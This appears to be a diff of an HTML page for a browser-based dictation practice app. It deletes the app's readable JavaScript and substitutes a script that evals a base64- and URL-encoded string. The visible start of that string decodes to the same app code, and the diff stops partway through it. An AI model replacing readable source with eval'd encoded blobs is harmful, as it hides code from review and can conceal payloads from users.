@@ -617,835 +617,920 @@ select:focus { outline: 2px solid var(--primary); border-color: transparent; }
     </div>
   </div>
 
-<script>
-/* ===== Dictation App - client-only ===== */
-
-
-// ----- Globals -----
-let dictationItems = [];
-let currentIndex = 0;
-let isPlaying = false;
-let isPaused = false;
-let pauseResolve = null;
-let dictationGen = 0;      // incremented on each jumpTo/start to cancel prior loop
-let isRepeating = false;   // true while repeat-current loop is active
-
-let dictationMode = 'word';
-let pauseDuration = 2000;
-let ttsDelay = 0;
-let repeatCount = 1;
-let speechRate = 0.9;
-let selectedVoice = null;
-
-// ----- DOM helpers -----
-const $ = id => document.getElementById(id);
-const qs = (sel, ctx = document) => ctx.querySelector(sel);
-const qsa = (sel, ctx = document) => [...ctx.querySelectorAll(sel)];
-
-// ----- Internationalisation -----
-const TRANSLATIONS = {
-  en: {
-    appTitle: 'Dictation',
-    tabDictation: 'Dictation',
-    sectionContent: 'Content',
-    inputPasteText: 'Paste Text',
-    inputUploadFile: 'Upload File',
-    textareaPlaceholder: 'Paste or type your text here…',
-    dropText: 'Drop a .txt file here or <u>click to browse</u>',
-    sectionSettings: 'Settings',
-    labelMode: 'Mode',
-    modeWord: 'Word by Word',
-    modeSentence: 'Sentence by Sentence',
-    labelPause: 'Pause between items:',
-    labelRepeat: 'Repeat each item:',
-    labelVoice: 'Voice',
-    voiceLoading: 'Loading…',
-    voiceNoMatches: 'No matches',
-    labelRate: 'Speech Rate:',
-    browserVoices: 'Browser Voices',
-    btnShow: 'Show',
-    btnHide: 'Hide',
-    btnResume: '▶ Resume',
-    alertNoText: 'Please enter or load some text first.',
-    menuHelp: 'Help',
-    menuHowTo: 'How to use',
-    menuAbout: 'About',
-    helpTitle: 'Help',
-    aboutTitle: 'About',
-  },
-  fr: {
-    appTitle: 'Dictée',
-    tabDictation: 'Dictée',
-    sectionContent: 'Contenu',
-    inputPasteText: 'Coller du texte',
-    inputUploadFile: 'Télécharger un fichier',
-    textareaPlaceholder: 'Collez ou tapez votre texte ici…',
-    dropText: 'Déposez un fichier .txt ici ou <u>cliquez pour parcourir</u>',
-    sectionSettings: 'Paramètres',
-    labelMode: 'Mode',
-    modeWord: 'Mot par mot',
-    modeSentence: 'Phrase par phrase',
-    labelPause: 'Pause entre les éléments :',
-    labelRepeat: 'Répéter chaque élément :',
-    labelVoice: 'Voix',
-    voiceLoading: 'Chargement…',
-    voiceNoMatches: 'Aucun résultat',
-    labelRate: 'Vitesse de parole :',
-    browserVoices: 'Voix du navigateur',
-    btnShow: 'Afficher',
-    btnHide: 'Masquer',
-    btnResume: '▶ Reprendre',
-    alertNoText: 'Veuillez d\'abord saisir ou charger du texte.',
-    menuHelp: 'Aide',
-    menuHowTo: 'Comment utiliser',
-    menuAbout: 'À propos',
-    helpTitle: 'Aide',
-    aboutTitle: 'À propos',
-  },
-  zh: {
-    appTitle: '听写',
-    tabDictation: '听写',
-    sectionContent: '内容',
-    inputPasteText: '粘贴文本',
-    inputUploadFile: '上传文件',
-    textareaPlaceholder: '在此粘贴或输入文本…',
-    dropText: '将 .txt 文件拖放到此处或<u>点击浏览</u>',
-    sectionSettings: '设置',
-    labelMode: '模式',
-    modeWord: '逐词',
-    modeSentence: '逐句',
-    labelPause: '每项暂停：',
-    labelRepeat: '每项重复：',
-    labelVoice: '声音',
-    voiceLoading: '加载中…',
-    voiceNoMatches: '无匹配项',
-    labelRate: '语速：',
-    browserVoices: '浏览器声音',
-    btnShow: '显示',
-    btnHide: '隐藏',
-    btnResume: '▶ 继续',
-    alertNoText: '请先输入或加载文本。',
-    menuHelp: '帮助',
-    menuHowTo: '使用说明',
-    menuAbout: '关于',
-    helpTitle: '帮助',
-    aboutTitle: '关于',
-  },
-  es: {
-    appTitle: 'Dictado',
-    tabDictation: 'Dictado',
-    sectionContent: 'Contenido',
-    inputPasteText: 'Pegar texto',
-    inputUploadFile: 'Subir archivo',
-    textareaPlaceholder: 'Pega o escribe tu texto aquí…',
-    dropText: 'Suelta un archivo .txt aquí o <u>haz clic para buscar</u>',
-    sectionSettings: 'Configuración',
-    labelMode: 'Modo',
-    modeWord: 'Palabra por palabra',
-    modeSentence: 'Frase por frase',
-    labelPause: 'Pausa entre elementos:',
-    labelRepeat: 'Repetir cada elemento:',
-    labelVoice: 'Voz',
-    voiceLoading: 'Cargando…',
-    voiceNoMatches: 'Sin resultados',
-    labelRate: 'Velocidad de habla:',
-    browserVoices: 'Voces del navegador',
-    btnShow: 'Mostrar',
-    btnHide: 'Ocultar',
-    btnResume: '▶ Reanudar',
-    alertNoText: 'Por favor, introduce o carga texto primero.',
-    menuHelp: 'Ayuda',
-    menuHowTo: 'Cómo usar',
-    menuAbout: 'Acerca de',
-    helpTitle: 'Ayuda',
-    aboutTitle: 'Acerca de',
-  },
-  de: {
-    appTitle: 'Diktat',
-    tabDictation: 'Diktat',
-    sectionContent: 'Inhalt',
-    inputPasteText: 'Text einfügen',
-    inputUploadFile: 'Datei hochladen',
-    textareaPlaceholder: 'Text hier einfügen oder eingeben…',
-    dropText: '.txt-Datei hier ablegen oder <u>zum Durchsuchen klicken</u>',
-    sectionSettings: 'Einstellungen',
-    labelMode: 'Modus',
-    modeWord: 'Wort für Wort',
-    modeSentence: 'Satz für Satz',
-    labelPause: 'Pause zwischen Elementen:',
-    labelRepeat: 'Jedes Element wiederholen:',
-    labelVoice: 'Stimme',
-    voiceLoading: 'Wird geladen…',
-    voiceNoMatches: 'Keine Treffer',
-    labelRate: 'Sprechgeschwindigkeit:',
-    browserVoices: 'Browser-Stimmen',
-    btnShow: 'Anzeigen',
-    btnHide: 'Ausblenden',
-    btnResume: '▶ Fortsetzen',
-    alertNoText: 'Bitte zuerst Text eingeben oder laden.',
-    menuHelp: 'Hilfe',
-    menuHowTo: 'Anleitung',
-    menuAbout: 'Über',
-    helpTitle: 'Hilfe',
-    aboutTitle: 'Über',
-  },
-};
-
-let currentLang = 'en';
-
-function t(key) {
-  return (TRANSLATIONS[currentLang] || TRANSLATIONS.en)[key] ?? TRANSLATIONS.en[key] ?? key;
-}
-
-function applyLang() {
-  document.documentElement.lang = currentLang;
-  document.title = t('appTitle');
-  qsa('[data-i18n]').forEach(el => { el.textContent = t(el.dataset.i18n); });
-  qsa('[data-i18n-html]').forEach(el => { el.innerHTML = t(el.dataset.i18nHtml); });
-  qsa('[data-i18n-placeholder]').forEach(el => { el.placeholder = t(el.dataset.i18nPlaceholder); });
-
-  // Recalculate settings collapse height in case text reflow changed it
-  const body = $('settings-body');
-  if (body && body.style.maxHeight !== '0px') {
-    body.style.maxHeight = 'none';
-    body.style.maxHeight = body.scrollHeight + 'px';
-  }
-}
-
-function initLang() {
-  // Auto-detect from browser if no saved preference
-  const saved = localStorage.getItem('lang');
-  if (saved && TRANSLATIONS[saved]) {
-    currentLang = saved;
-  } else {
-    const browserLang = navigator.language.split('-')[0];
-    currentLang = TRANSLATIONS[browserLang] ? browserLang : 'en';
-  }
-
-  const sel = $('lang-select');
-  sel.value = currentLang;
-  sel.addEventListener('change', () => {
-    currentLang = sel.value;
-    localStorage.setItem('lang', currentLang);
-    applyLang();
-    autoSelectVoiceForLang(currentLang);
-  });
-
-  applyLang();
-}
-
-// ----- Init -----
-document.addEventListener('DOMContentLoaded', () => {
-  initLang();
-  initTabs();
-  initInputTabs();
-  initFileUpload();
-  initSettings();
-  initPlayback();
-  loadBrowserVoices();
-  initSettingsCollapse();
-  initHelpMenu();
-});
-
-// ----- Help menu & modals -----
-const HELP_CONTENT = {
-  en: `
-    <h3>What is this?</h3>
-    <p>Dictation is a practice tool that reads your text aloud word-by-word or sentence-by-sentence, so you can write down what you hear — just like a classroom dictation exercise.</p>
-    <h3>Getting started</h3>
-    <ul>
-      <li>Paste or type text in the <strong>Content</strong> box, or upload a <strong>.txt file</strong>.</li>
-      <li>Press <strong>▶ Play</strong> to start. The app will speak each item and pause before moving to the next.</li>
-      <li>Use <strong>Show / Hide</strong> to reveal or conceal the current word or sentence on screen.</li>
-    </ul>
-    <h3>Settings</h3>
-    <ul>
-      <li><strong>Mode</strong> — Word by Word or Sentence by Sentence. In sentence mode, the app also pauses at commas.</li>
-      <li><strong>Pause</strong> — gap between items (0.5 s – 10 s).</li>
-      <li><strong>Repeat</strong> — how many times each item is spoken before moving on.</li>
-      <li><strong>Voice</strong> — choose any voice installed on your device.</li>
-      <li><strong>Speech Rate</strong> — slow down or speed up the voice.</li>
-      <li><strong>TTS startup delay</strong> — increase if the first word of each item is cut off (browser-dependent).</li>
-    </ul>
-    <h3>Playback controls</h3>
-    <ul>
-      <li><strong>⏮ / ⏭</strong> — jump to the previous or next item, preserving the current play/pause state.</li>
-      <li><strong>⏸</strong> — pause and resume.</li>
-      <li><strong>🔁</strong> — loop the current item continuously at the current speed and pause interval. Click <strong>▶</strong> to stop looping and advance to the next item.</li>
-      <li><strong>⏹</strong> — stop and reset.</li>
-    </ul>`,
-  fr: `
-    <h3>À quoi ça sert ?</h3>
-    <p>Dictée est un outil d'entraînement qui lit votre texte à voix haute mot par mot ou phrase par phrase, pour que vous puissiez écrire ce que vous entendez.</p>
-    <h3>Démarrage</h3>
-    <ul>
-      <li>Collez ou tapez du texte dans la zone <strong>Contenu</strong>, ou importez un <strong>fichier .txt</strong>.</li>
-      <li>Appuyez sur <strong>▶ Lecture</strong> pour commencer.</li>
-      <li>Utilisez <strong>Afficher / Masquer</strong> pour révéler ou cacher le mot ou la phrase en cours.</li>
-    </ul>
-    <h3>Paramètres</h3>
-    <ul>
-      <li><strong>Mode</strong> — Mot par mot ou Phrase par phrase. En mode phrase, l'application marque aussi une pause aux virgules.</li>
-      <li><strong>Pause</strong> — délai entre les éléments.</li>
-      <li><strong>Répétition</strong> — nombre de répétitions avant de passer à la suite.</li>
-      <li><strong>Voix</strong> — choisissez une voix installée sur l'appareil.</li>
-      <li><strong>Vitesse</strong> — ralentir ou accélérer la voix.</li>
-      <li><strong>Délai de démarrage TTS</strong> — augmentez si le premier mot est coupé (selon le navigateur).</li>
-    </ul>
-    <h3>Contrôles de lecture</h3>
-    <ul>
-      <li><strong>⏮ / ⏭</strong> — élément précédent / suivant, en conservant l'état lecture/pause.</li>
-      <li><strong>⏸</strong> — pause et reprise.</li>
-      <li><strong>🔁</strong> — répète l'élément en cours en boucle à la vitesse et au délai définis. Cliquez sur <strong>▶</strong> pour arrêter la boucle et passer à la suite.</li>
-      <li><strong>⏹</strong> — arrêt et réinitialisation.</li>
-    </ul>`,
-  zh: `
-    <h3>这是什么？</h3>
-    <p>听写是一款练习工具，逐词或逐句朗读您的文本，让您像课堂听写一样边听边写。</p>
-    <h3>快速开始</h3>
-    <ul>
-      <li>在<strong>内容</strong>框中粘贴或输入文本，或上传 <strong>.txt 文件</strong>。</li>
-      <li>按 <strong>▶ 播放</strong> 开始，应用将朗读每个项目并在继续之前暂停。</li>
-      <li>使用<strong>显示 / 隐藏</strong>按钮来显示或隐藏当前词句。</li>
-    </ul>
-    <h3>设置说明</h3>
-    <ul>
-      <li><strong>模式</strong> — 逐词或逐句。逐句模式下，逗号处也会暂停。</li>
-      <li><strong>暂停</strong> — 每项之间的间隔时间。</li>
-      <li><strong>重复</strong> — 每项朗读次数。</li>
-      <li><strong>声音</strong> — 选择设备上安装的语音。</li>
-      <li><strong>语速</strong> — 加快或减慢朗读速度。</li>
-      <li><strong>TTS 启动延迟</strong> — 若每项第一个词被截断，请适当增大此值（因浏览器而异）。</li>
-    </ul>
-    <h3>播放控制</h3>
-    <ul>
-      <li><strong>⏮ / ⏭</strong> — 上一个 / 下一个，保持当前播放或暂停状态。</li>
-      <li><strong>⏸</strong> — 暂停与继续。</li>
-      <li><strong>🔁</strong> — 以当前速度和间隔循环播放当前项。点击 <strong>▶</strong> 停止循环并继续。</li>
-      <li><strong>⏹</strong> — 停止并重置。</li>
-    </ul>`,
-  es: `
-    <h3>¿Para qué sirve?</h3>
-    <p>Dictado es una herramienta de práctica que lee tu texto en voz alta palabra por palabra o frase por frase, para que puedas escribir lo que escuchas.</p>
-    <h3>Primeros pasos</h3>
-    <ul>
-      <li>Pega o escribe texto en el cuadro <strong>Contenido</strong>, o sube un <strong>archivo .txt</strong>.</li>
-      <li>Pulsa <strong>▶ Reproducir</strong> para empezar.</li>
-      <li>Usa <strong>Mostrar / Ocultar</strong> para ver o esconder la palabra o frase actual.</li>
-    </ul>
-    <h3>Ajustes</h3>
-    <ul>
-      <li><strong>Modo</strong> — Palabra por palabra o Frase por frase. En modo frase, también se pausa en las comas.</li>
-      <li><strong>Pausa</strong> — tiempo entre elementos.</li>
-      <li><strong>Repetir</strong> — veces que se repite cada elemento.</li>
-      <li><strong>Voz</strong> — elige una voz instalada en tu dispositivo.</li>
-      <li><strong>Velocidad</strong> — ralentiza o acelera la voz.</li>
-      <li><strong>Retardo de inicio TTS</strong> — auméntalo si se corta la primera palabra (depende del navegador).</li>
-    </ul>
-    <h3>Controles de reproducción</h3>
-    <ul>
-      <li><strong>⏮ / ⏭</strong> — elemento anterior / siguiente, conservando el estado de reproducción.</li>
-      <li><strong>⏸</strong> — pausa y reanuda.</li>
-      <li><strong>🔁</strong> — repite el elemento actual en bucle. Haz clic en <strong>▶</strong> para salir del bucle y avanzar.</li>
-      <li><strong>⏹</strong> — detiene y reinicia.</li>
-    </ul>`,
-  de: `
-    <h3>Wofür ist das?</h3>
-    <p>Diktat ist ein Übungswerkzeug, das Ihren Text Wort für Wort oder Satz für Satz vorliest, damit Sie schreiben können, was Sie hören.</p>
-    <h3>Erste Schritte</h3>
-    <ul>
-      <li>Text in das Feld <strong>Inhalt</strong> einfügen oder eine <strong>.txt-Datei</strong> hochladen.</li>
-      <li><strong>▶ Wiedergabe</strong> drücken, um zu beginnen.</li>
-      <li><strong>Anzeigen / Ausblenden</strong> nutzen, um das aktuelle Wort oder den Satz ein- oder auszublenden.</li>
-    </ul>
-    <h3>Einstellungen</h3>
-    <ul>
-      <li><strong>Modus</strong> — Wort für Wort oder Satz für Satz. Im Satzmodus wird auch bei Kommas pausiert.</li>
-      <li><strong>Pause</strong> — Abstand zwischen den Elementen.</li>
-      <li><strong>Wiederholen</strong> — wie oft jedes Element gesprochen wird.</li>
-      <li><strong>Stimme</strong> — eine auf dem Gerät installierte Stimme wählen.</li>
-      <li><strong>Geschwindigkeit</strong> — Sprache verlangsamen oder beschleunigen.</li>
-      <li><strong>TTS-Startverzögerung</strong> — erhöhen, wenn das erste Wort abgeschnitten wird (browserabhängig).</li>
-    </ul>
-    <h3>Wiedergabe-Steuerung</h3>
-    <ul>
-      <li><strong>⏮ / ⏭</strong> — vorheriges / nächstes Element, Wiedergabe-/Pausezustand bleibt erhalten.</li>
-      <li><strong>⏸</strong> — Pause und Fortsetzen.</li>
-      <li><strong>🔁</strong> — wiederholt das aktuelle Element in einer Schleife. <strong>▶</strong> klicken, um die Schleife zu beenden und weiterzumachen.</li>
-      <li><strong>⏹</strong> — Stopp und Zurücksetzen.</li>
-    </ul>`,
-};
-
-const ABOUT_CONTENT = {
-  en: `<div class="about-center">
-    <div class="about-app-name">Dictation</div>
-    <div class="about-copy">
-      <p>A free, offline dictation practice tool.<br>Runs entirely in your browser — no data is sent anywhere.</p>
-      <p style="margin-top:16px;">Copyright &copy; 2026 <strong>CHEN XI</strong><br>All rights reserved.</p>
-    </div>
-  </div>`,
-  fr: `<div class="about-center">
-    <div class="about-app-name">Dictée</div>
-    <div class="about-copy">
-      <p>Un outil de dictée gratuit et hors ligne.<br>Fonctionne entièrement dans votre navigateur.</p>
-      <p style="margin-top:16px;">Copyright &copy; 2026 <strong>CHEN XI</strong><br>Tous droits réservés.</p>
-    </div>
-  </div>`,
-  zh: `<div class="about-center">
-    <div class="about-app-name">听写</div>
-    <div class="about-copy">
-      <p>免费离线听写练习工具。<br>完全在浏览器中运行，不发送任何数据。</p>
-      <p style="margin-top:16px;">版权所有 &copy; 2026 <strong>陈希</strong><br>保留所有权利。</p>
-    </div>
-  </div>`,
-  es: `<div class="about-center">
-    <div class="about-app-name">Dictado</div>
-    <div class="about-copy">
-      <p>Una herramienta de dictado gratuita y sin conexión.<br>Funciona completamente en tu navegador.</p>
-      <p style="margin-top:16px;">Copyright &copy; 2026 <strong>CHEN XI</strong><br>Todos los derechos reservados.</p>
-    </div>
-  </div>`,
-  de: `<div class="about-center">
-    <div class="about-app-name">Diktat</div>
-    <div class="about-copy">
-      <p>Ein kostenloses, offline Diktat-Übungswerkzeug.<br>Läuft vollständig im Browser.</p>
-      <p style="margin-top:16px;">Copyright &copy; 2026 <strong>CHEN XI</strong><br>Alle Rechte vorbehalten.</p>
-    </div>
-  </div>`,
-};
-
-function openModal(id) {
-  $('help-menu-dropdown').classList.remove('open');
-  if (id === 'help-modal') {
-    $('help-modal-body').innerHTML = HELP_CONTENT[currentLang] || HELP_CONTENT.en;
-  } else {
-    $('about-modal-body').innerHTML = ABOUT_CONTENT[currentLang] || ABOUT_CONTENT.en;
-  }
-  $(id).classList.add('open');
-  document.body.style.overflow = 'hidden';
-}
-
-function closeModal(id) {
-  $(id).classList.remove('open');
-  document.body.style.overflow = '';
-}
-
-function initHelpMenu() {
-  const btn = $('help-menu-btn');
-  const dropdown = $('help-menu-dropdown');
-
-  btn.addEventListener('click', e => {
-    e.stopPropagation();
-    dropdown.classList.toggle('open');
-  });
-
-  document.addEventListener('pointerdown', e => {
-    if (!btn.parentElement.contains(e.target)) dropdown.classList.remove('open');
-  });
-
-  $('open-help').addEventListener('click', () => openModal('help-modal'));
-  $('open-about').addEventListener('click', () => openModal('about-modal'));
-
-  // Close buttons inside modals
-  qsa('[data-close]').forEach(el => {
-    el.addEventListener('click', () => closeModal(el.dataset.close));
-  });
-
-  // Click backdrop to close
-  qsa('.modal-backdrop').forEach(backdrop => {
-    backdrop.addEventListener('click', e => {
-      if (e.target === backdrop) closeModal(backdrop.id);
-    });
-  });
-
-  // Escape key
-  document.addEventListener('keydown', e => {
-    if (e.key === 'Escape') {
-      qsa('.modal-backdrop.open').forEach(m => closeModal(m.id));
-      dropdown.classList.remove('open');
-    }
-  });
-}
-
-// ----- Main tab switching -----
-function initTabs() {
-  qsa('.tab-btn').forEach(btn => {
-    btn.addEventListener('click', () => {
-      qsa('.tab-btn').forEach(b => b.classList.remove('active'));
-      qsa('.tab-panel').forEach(p => p.classList.remove('active'));
-      btn.classList.add('active');
-      $('tab-' + btn.dataset.tab).classList.add('active');
-    });
-  });
-}
-
-// ----- Input tabs -----
-function initInputTabs() {
-  qsa('.input-tab-btn').forEach(btn => {
-    btn.addEventListener('click', () => {
-      qsa('.input-tab-btn').forEach(b => b.classList.remove('active'));
-      qsa('.input-panel').forEach(p => p.classList.remove('active'));
-      btn.classList.add('active');
-      $('input-' + btn.dataset.input).classList.add('active');
-    });
-  });
-}
-
-// ----- File upload -----
-function initFileUpload() {
-  const drop = $('file-drop');
-  const input = $('file-input');
-
-  drop.addEventListener('click', () => input.click());
-  input.addEventListener('change', () => readFile(input.files[0]));
-
-  drop.addEventListener('dragover', e => { e.preventDefault(); drop.classList.add('drag-over'); });
-  drop.addEventListener('dragleave', () => drop.classList.remove('drag-over'));
-  drop.addEventListener('drop', e => {
-    e.preventDefault();
-    drop.classList.remove('drag-over');
-    readFile(e.dataTransfer.files[0]);
-  });
-}
-
-function readFile(file) {
-  if (!file) return;
-  const reader = new FileReader();
-  reader.onload = e => {
-    $('text-input').value = e.target.result;
-    qsa('.input-tab-btn').forEach(b => b.classList.remove('active'));
-    qsa('.input-panel').forEach(p => p.classList.remove('active'));
-    qs('[data-input="text"]').classList.add('active');
-    $('input-text').classList.add('active');
-  };
-  reader.readAsText(file);
-}
-
-// ----- Settings -----
-function initSettings() {
-  qsa('.toggle-btn[data-mode]').forEach(btn => {
-    btn.addEventListener('click', () => {
-      if (btn.dataset.mode === dictationMode) return;
-      qsa('.toggle-btn[data-mode]').forEach(b => b.classList.remove('active'));
-      btn.classList.add('active');
-      dictationMode = btn.dataset.mode;
-      if (isPlaying && dictationItems.length) {
-        const oldItems = dictationItems;
-        const oldIndex = currentIndex;
-        const text = $('text-input').value.trim();
-        dictationItems = parseContent(text, dictationMode);
-        if (dictationMode === 'word') {
-          // sentence→word: count words in all preceding sentences to find start of current sentence
-          const wordsBefore = oldItems.slice(0, oldIndex)
-            .reduce((n, s) => n + s.split(/\s+/).filter(w => w).length, 0);
-          currentIndex = Math.min(wordsBefore, dictationItems.length - 1);
-        } else {
-          // word→sentence: find the sentence that contains the current word
-          const word = oldItems[oldIndex];
-          const match = dictationItems.findIndex(s => s.includes(word));
-          currentIndex = match >= 0 ? match : 0;
-        }
-        cancelLoop();
-        const gen = ++dictationGen;
-        updateButtons();
-        runLoop(gen);
-      }
-    });
-  });
-
-  const pauseSlider = $('pause-slider');
-  pauseSlider.addEventListener('input', () => {
-    pauseDuration = parseFloat(pauseSlider.value) * 1000;
-    $('pause-val').textContent = parseFloat(pauseSlider.value).toFixed(1);
-  });
-
-  const repeatSlider = $('repeat-slider');
-  repeatSlider.addEventListener('input', () => {
-    repeatCount = parseInt(repeatSlider.value);
-    $('repeat-val').textContent = repeatCount;
-  });
-
-  const ttsDelaySlider = $('tts-delay-slider');
-  ttsDelaySlider.addEventListener('input', () => {
-    ttsDelay = parseInt(ttsDelaySlider.value);
-    $('tts-delay-val').textContent = ttsDelay;
-  });
-
-  const rateSlider = $('rate-slider');
-  rateSlider.addEventListener('input', () => {
-    speechRate = parseFloat(rateSlider.value);
-    $('rate-val').textContent = speechRate.toFixed(1);
-  });
-
-}
-
-function initSettingsCollapse() {
-  const toggle = $('settings-toggle');
-  const body = $('settings-body');
-  body.style.maxHeight = body.scrollHeight + 'px';
-
-  toggle.addEventListener('click', () => {
-    const open = body.style.maxHeight !== '0px';
-    body.style.maxHeight = open ? '0px' : body.scrollHeight + 'px';
-    toggle.querySelector('.chevron').classList.toggle('open', !open);
-  });
-}
-
-// Maps UI language codes to BCP-47 prefixes used by TTS voices
-const LANG_TO_VOICE_PREFIX = { en: 'en', fr: 'fr', zh: 'zh', es: 'es', de: 'de' };
-
-function autoSelectVoiceForLang(lang) {
-  const prefix = LANG_TO_VOICE_PREFIX[lang];
-  if (!prefix) return;
-  const voices = speechSynthesis.getVoices();
-  const match = voices.find(v => v.lang.startsWith(prefix));
-  if (!match) return;
-  const idx = voices.indexOf(match);
-  const sel = $('voice-select');
-  sel.value = idx;
-  selectedVoice = match;
-}
-
-// ----- Voice select -----
-function loadBrowserVoices() {
-  function populate() {
-    const voices = speechSynthesis.getVoices();
-    const sel = $('voice-select');
-    const prevName = selectedVoice ? selectedVoice.name : null;
-    sel.innerHTML = '';
-    voices.forEach((v, i) => {
-      const opt = document.createElement('option');
-      opt.value = i;
-      opt.textContent = `${v.name} (${v.lang})${v.default ? ' ★' : ''}`;
-      sel.appendChild(opt);
-    });
-    if (!voices.length) return;
-
-    // Pick voice: restore previous selection, else prefer en-US/en-GB/any-en
-    let pick = prevName ? voices.findIndex(v => v.name === prevName) : -1;
-    if (pick === -1) {
-      pick = voices.findIndex(v => v.lang === 'en-US');
-      if (pick === -1) pick = voices.findIndex(v => v.lang === 'en-GB');
-      if (pick === -1) pick = voices.findIndex(v => /^en/.test(v.lang));
-      if (pick === -1) pick = voices.findIndex(v => v.default);
-      if (pick === -1) pick = 0;
-    }
-    sel.value = pick;
-    selectedVoice = voices[pick];
-  }
-
-  $('voice-select').addEventListener('change', () => {
-    const voices = speechSynthesis.getVoices();
-    selectedVoice = voices[+$('voice-select').value] || null;
-  });
-
-  if (speechSynthesis.getVoices().length) populate();
-  speechSynthesis.onvoiceschanged = populate;
-}
-
-
-// ----- Playback engine -----
-// Single source of truth: isPlaying = loop is running, isRepeating = loop behaviour flag only.
-function initPlayback() {
-  $('play-btn').addEventListener('click', handlePlayPause);
-  $('repeat-btn').addEventListener('click', toggleRepeat);
-  $('stop-btn').addEventListener('click', stopDictation);
-  $('prev-btn').addEventListener('click', () => jumpTo(currentIndex - 1));
-  $('next-btn').addEventListener('click', () => jumpTo(currentIndex + 1));
-  $('reveal-btn').addEventListener('click', toggleReveal);
-}
-
-function parseContent(text, mode) {
-  if (mode === 'sentence') {
-    return text
-      .replace(/([.!?,])\s+/g, '$1\n')
-      .split('\n')
-      .map(s => s.trim())
-      .filter(s => s.length > 1);
-  }
-  return text.split(/\s+/).filter(w => w.length > 0);
-}
-
-function handlePlayPause() {
-  if (!isPlaying) { startDictation(); return; }
-  togglePause();
-}
-
-async function startDictation() {
-  const text = $('text-input').value.trim();
-  if (!text) { alert(t('alertNoText')); return; }
-  dictationItems = parseContent(text, dictationMode);
-  if (!dictationItems.length) return;
-  currentIndex = 0;
-  isPlaying = true;
-  isPaused = false;
-  speechSynthesis.cancel();
-  const gen = ++dictationGen;
-  updateButtons();
-  await runLoop(gen);
-}
-
-// One loop for both normal and repeat mode. isRepeating is just a flag it reads.
-async function runLoop(gen) {
-  while (dictationGen === gen) {
-    updateDisplay(currentIndex);
-    if (isPaused) await waitForResume();
-    if (dictationGen !== gen) break;
-
-    for (let r = 0; r < repeatCount && dictationGen === gen; r++) {
-      if (isPaused) await waitForResume();
-      if (dictationGen !== gen) break;
-      await speakItem(dictationItems[currentIndex]);
-      if (dictationGen !== gen) break;
-      if (r + 1 < repeatCount) await sleep(pauseDuration);
-    }
-
-    if (dictationGen !== gen) break;
-
-    if (isRepeating) {
-      await sleep(pauseDuration);
-      // stay on same index — loop back to top
-    } else {
-      if (currentIndex + 1 >= dictationItems.length) break;
-      await sleep(pauseDuration);
-      if (dictationGen !== gen) break;
-      currentIndex++;
-    }
-  }
-
-  if (dictationGen === gen) {
-    isPlaying = false;
-    isRepeating = false;
-    updateButtons();
-  }
-}
-
-async function speakItem(item) {
-  await speakTTS(item);
-}
-
-function speakTTS(text) {
-  return new Promise(resolve => {
-    function speakMain() {
-      const utter = new SpeechSynthesisUtterance(text);
-      if (selectedVoice) { utter.voice = selectedVoice; utter.lang = selectedVoice.lang; }
-      utter.rate = speechRate;
-      utter.onend = resolve;
-      utter.onerror = resolve;
-      speechSynthesis.speak(utter);
-    }
-    // Queue main utterance only after warmup ends so the TTS engine is fully
-    // initialized before the first real word plays (fixes first-click silence).
-    const warmup = new SpeechSynthesisUtterance('.');
-    warmup.volume = 0;
-    warmup.rate = 10;
-    if (selectedVoice) { warmup.voice = selectedVoice; warmup.lang = selectedVoice.lang; }
-    warmup.onend = speakMain;
-    warmup.onerror = speakMain;
-    speechSynthesis.speak(warmup);
-  });
-}
-
-function sleep(ms) {
-  return new Promise(resolve => {
-    const timer = setTimeout(resolve, ms);
-    pauseResolve = () => { clearTimeout(timer); resolve(); };
-  }).then(() => { pauseResolve = null; });
-}
-
-function waitForResume() {
-  return new Promise(resolve => { pauseResolve = resolve; });
-}
-
-function cancelLoop() {
-  speechSynthesis.cancel();
-  if (pauseResolve) { const r = pauseResolve; pauseResolve = null; r(); }
-}
-
-function updateButtons() {
-  const playBtn = $('play-btn');
-  if (isPlaying && !isPaused) {
-    playBtn.textContent = '⏸';
-    playBtn.title = 'Pause';
-  } else {
-    playBtn.textContent = '▶';
-    playBtn.title = isPaused ? 'Resume' : 'Play';
-  }
-  playBtn.disabled = false;
-  $('repeat-btn').disabled = !isPlaying;
-  $('repeat-btn').classList.toggle('active', isRepeating);
-  $('repeat-btn').title = isRepeating ? 'Stop repeating' : 'Repeat current';
-  $('stop-btn').disabled = !isPlaying;
-  if (!isPlaying) {
-    $('prev-btn').disabled = true;
-    $('next-btn').disabled = true;
-  }
-}
-
-function togglePause() {
-  if (!isPlaying) return;
-  isPaused = !isPaused;
-  if (isPaused) {
-    speechSynthesis.pause();
-    // interrupt inter-item sleep so loop parks at waitForResume immediately
-    if (pauseResolve) { const r = pauseResolve; pauseResolve = null; r(); }
-  } else {
-    speechSynthesis.resume();
-    if (pauseResolve) { const r = pauseResolve; pauseResolve = null; r(); }
-  }
-  updateButtons();
-}
-
-function toggleRepeat() {
-  if (!isPlaying) return;
-  isRepeating = !isRepeating;
-  updateButtons();
-}
-
-function stopDictation() {
-  dictationGen++;
-  isPlaying = false;
-  isPaused = false;
-  isRepeating = false;
-  cancelLoop();
-  updateButtons();
-  $('current-item').textContent = '—';
-  $('progress-text').textContent = '0 / 0';
-  $('progress-bar').style.width = '0%';
-}
-
-function jumpTo(index) {
-  if (index < 0 || index >= dictationItems.length) return;
-  currentIndex = index;
-  isPlaying = true;
-  cancelLoop();
-  const gen = ++dictationGen;
-  updateButtons();
-  runLoop(gen);
-}
-
-function updateDisplay(index) {
-  const item = dictationItems[index];
-  const el = $('current-item');
-  el.textContent = item;
-  const hidden = el.dataset.hidden === 'true';
-  el.classList.toggle('hidden-text', hidden);
-
-  const total = dictationItems.length;
-  $('progress-text').textContent = `${index + 1} / ${total}`;
-  $('progress-bar').style.width = ((index + 1) / total * 100) + '%';
-  $('prev-btn').disabled = index === 0;
-  $('next-btn').disabled = index >= total - 1;
-}
-
-function toggleReveal() {
-  const el = $('current-item');
-  const hidden = el.dataset.hidden === 'true';
-  el.dataset.hidden = hidden ? 'false' : 'true';
-  el.classList.toggle('hidden-text', !hidden);
-  $('reveal-btn').textContent = hidden ? t('btnHide') : t('btnShow');
-}
-
-</script>
+<script>eval(decodeURIComponent(atob(
+    "JTBBJTJGJTJBJTIwJTNEJTNEJTNEJTNEJTNEJTIwRGljdGF0aW9uJTIwQXBwJTIwLSUyMGNsaWVudC1v"
+    +"bmx5JTIwJTNEJTNEJTNEJTNEJTNEJTIwJTJBJTJGJTBBJTBBJTBBJTJGJTJGJTIwLS0tLS0lMjBHbG9i"
